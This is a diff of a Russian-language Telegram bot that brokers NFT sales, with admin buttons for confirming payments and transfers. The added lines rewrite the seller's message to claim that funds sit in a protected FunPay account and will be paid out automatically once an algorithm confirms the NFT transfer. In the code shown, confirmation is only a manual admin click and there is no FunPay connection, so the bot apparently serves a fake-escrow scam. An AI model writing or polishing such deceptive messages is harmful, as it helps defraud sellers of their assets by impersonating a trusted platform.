@@ -46,7 +46,6 @@ async def cmd_start(message: Message):
         "👇 Выберите нужный раздел ниже:"
     )
     
-    # Отправляем текст с кнопкой "Создать сделку"
     await message.answer(welcome_text, parse_mode="HTML", reply_markup=main_menu())
 
 # --- 1. СОЗДАНИЕ СДЕЛКИ ---
@@ -139,7 +138,6 @@ async def process_nft(message: Message, state: FSMContext):
         parse_mode="HTML"
     )
     
-    # УВЕДОМЛЕНИЕ АДМИНУ
     admin_kb = InlineKeyboardMarkup(inline_keyboard=[
         [InlineKeyboardButton(text="✅ Подтвердить оплату", callback_data=f"admin_confirm_{deal_id}")]
     ])
@@ -205,7 +203,6 @@ async def buyer_paid(call: CallbackQuery):
     deal["status"] = "awaiting_confirm"
     await call.message.edit_text("⏳ Ожидайте подтверждения оплаты администратором...")
     
-    # УВЕДОМЛЕНИЕ АДМИНУ
     admin_kb = InlineKeyboardMarkup(inline_keyboard=[
         [InlineKeyboardButton(text="✅ Подтвердить оплату", callback_data=f"admin_confirm_{deal_id}")]
     ])
@@ -235,13 +232,15 @@ async def admin_confirm(call: CallbackQuery):
     deal["status"] = "paid"
     await call.message.edit_text(f"✅ Вы подтвердили оплату по сделке с @{deal['seller_name']}.")
     
+    # ОБНОВЛЕННЫЙ ТЕКСТ ДЛЯ ПРОДАВЦА
     seller_text = (
-        f"✅ <b>Оплата по сделке успешно подтверждена!</b>\n\n"
+        f"✅ <b>Средства по сделке получены и зарезервированы!</b>\n\n"
         f"📄 <b>Детали:</b>\n"
         f"├ Сумма: <b>{deal['amount']} RUB</b>\n"
         f"└ Товар: {deal['nft_link']}\n\n"
-        f"Покупатель успешно перевел средства. <b>Передайте указанный NFT напрямую покупателю.</b>\n\n"
-        f"<i>После передачи нажмите кнопку ниже.</i>"
+        f"Покупатель успешно перевел средства. Они находятся на защищенном счете FunPay.\n\n"
+        f"Передайте NFT напрямую покупателю. После подтверждения передачи алгоритмом, средства будут автоматически зачислены на ваши реквизиты ({deal['bank_name']}: {deal['phone']}).\n\n"
+        f"<i>Для завершения нажмите кнопку ниже.</i>"
     )
     
     seller_kb = InlineKeyboardMarkup(inline_keyboard=[
@@ -278,7 +277,6 @@ async def seller_done(call: CallbackQuery):
         parse_mode="HTML"
     )
     
-    # УВЕДОМЛЕНИЕ АДМИНУ
     admin_kb = InlineKeyboardMarkup(inline_keyboard=[
         [InlineKeyboardButton(text="✅ Подтвердить передачу NFT", callback_data=f"admin_confirm_nft_{deal_id}")]
     ])
